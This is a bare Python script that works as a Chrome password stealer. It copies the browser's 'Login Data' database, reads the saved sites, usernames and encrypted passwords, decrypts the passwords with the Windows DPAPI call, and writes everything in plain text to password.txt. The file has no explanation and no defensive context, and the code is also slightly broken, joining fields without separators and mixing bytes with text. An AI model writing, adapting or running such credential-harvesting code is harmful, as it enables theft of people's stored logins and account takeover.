from os import getenv
import sqlite3
import win32crypt
from shutil import copyfile

path = getenv('LOCALAPPDATA') + '\Google\Chrome\User Data\Default\Login Data'
cp_path = getenv('LOCALAPPDATA') + '\Google\Chrome\User Data\Default\Login2'
copyfile(path, cp_path)

conn = sqlite3.connect(cp_path)

cursor = conn.cursor()

cursor.execute('SELECT action_url, username_value, password_value FROM logins')

data = ''
for raw in cursor.fetchall():
    data += raw[0] + '\n' + raw[1]

    password = win32crypt.CryptUnprotectData(raw[2])
    data += password[1] + '\n'


with open('password.txt', 'w') as f:
    f.write(data)
    conn.close()
